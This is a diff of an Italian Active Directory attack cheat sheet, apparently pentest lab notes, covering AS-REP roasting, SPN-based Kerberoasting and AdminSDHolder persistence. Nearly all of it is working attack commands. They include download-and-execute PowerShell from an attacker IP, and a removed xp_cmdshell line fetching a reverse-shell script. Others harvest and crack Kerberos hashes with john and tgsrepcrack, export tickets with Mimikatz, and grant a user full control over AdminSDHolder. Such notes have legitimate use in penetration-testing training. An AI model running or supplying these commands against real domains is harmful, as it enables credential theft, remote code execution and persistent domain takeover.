@@ -268,16 +268,34 @@ Execute the task
 
 
 
-## Kerberoasting -AS-REPs [Normal User on the machine]
-### I server MS SQL sono generalmente distribuiti in abbondanza in un dominio Windows.
-### I server SQL offrono ottime possibilità di spostamento laterale, in quanto gli utenti del dominio possono essere mappati su ruoli di database.
+## Kerberoasting - AS-REPs [Normal User on the machine]
+### Se nelle impostazioni UserAccountControl di un utente è abilitata la funzione "Non richiedere la preautenticazione Kerberos", ossia la preautenticazione Kerberos è disabilitata, è possibile ottenere l'AS REP decifrabile dell'utente e forzarlo offline.
 
 ```
-			- powershell -ep bypass
-			- Import-Module PowerupSQL.psd1
-			- Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose [Gather information]
-			- Get-SQLServerLinkCrawl -Instance dbserver31.TECH.FINANCE.CORP -Query 'exec master..xp_cmds hell "powershell iex(New-Object Net.WebClient).DownloadString("http://$IP_Attacker/Invoke-PowerShellTcp.ps1")"' [esecuzione commandi]
+			- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-DomainUser -PreauthNotRequired -Verbose" 
+			- Invoke-ASREPRoast -Verbose (enumerazione di tutti gli utenti cpn Kerberos pre auth disabilitato)
+			- Get-ASREPHash -Username student1 -Verbose (prendere hash)
+			- ./john hash.txt --wordlist=wordlist.txt
+			- Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"} (enumerazione permessi per RDPUsers su ACL PowerView)
+			
 ```	
+
+## Kerberoasting - Set SPN [Normal User on the machine]
+### Con abbastanza privilegi (Generic All/Generic Write) l'SPN di un utente target può essere impostato su qualsiasi cosa (unico nel dominio). Si può richiedere TGS senza privilegi speciali
+
+```
+			- Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"} (enumerazione permessi per RDPUsers su ACL PowerView)
+			- Get-DomainUser -Identity supportuser | select serviceprincipalname (vedere se l'utente ha già un SPN)
+			- Set-DomainObject -Identity supportuser -Set @{serviceprincipalname='ops/whatever1'} (set SPN for the user)
+			- Add-Type -AssemblyName System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ops/whatever1"
+			o
+			- Request-SPNTicket (richiesta ticket)
+			- klist
+			- Invoke-Mimikatz -Command '"kerberos::list /export"' (esportare ticket)
+			- python.exe tgsrepcrack.py wordlist.txt ticket.kirbi (bruteforce password)
+			
+```
+
 
 ## Kerberoasting [Normal user on the machine]
 ### Cracking offline delle password degli account di servizio.
@@ -358,8 +376,7 @@ Execute the task
 ### AdminSDHolder è un container e viene utilizzato per controllare le autorizzazioni permessi utilizzando una ACL per alcuni gruppi privilegiati incorporati ( chiamati gruppi protetti come Domain Admins,Backup Operators,Server Operators..).L'ACL può essere visualizzato sull'oggetto AdminSDHolder stesso. Utenti e computer -> System -> AdminSDHolder e selezionare Proprietà. Security Descriptor Propagator (SDPROP) viene eseguito ogni ora e confronta l'ACL dei gruppi e dei membri protetti con l'ACL di AdminSDHolder e le eventuali differenze vengono sovrascritte nell'ACL dell'oggetto.
 ```
 			- Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder, CN=System' -PrincipalSamAccountName claudionepc -Rights -All -Verbose (Aggiundere da account nel DA pieno controllo ad un utente normale claudionepc al AdminSDHolder)
-			- Set-ADACL -DistinguishedName 'CN=AdminSDHolder, CN=System, DC=dollarcorp, DC=nomeycorp,DC=local' -Principal claudionepc -Verbose (Usare modulo ActiveDrectory)
-			- Invoke-SDPropagator -timeoutMinutes 1 -showProgress
+			- Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'claudionepc'}
 ```
 
 ## Trust Flow Across Forest
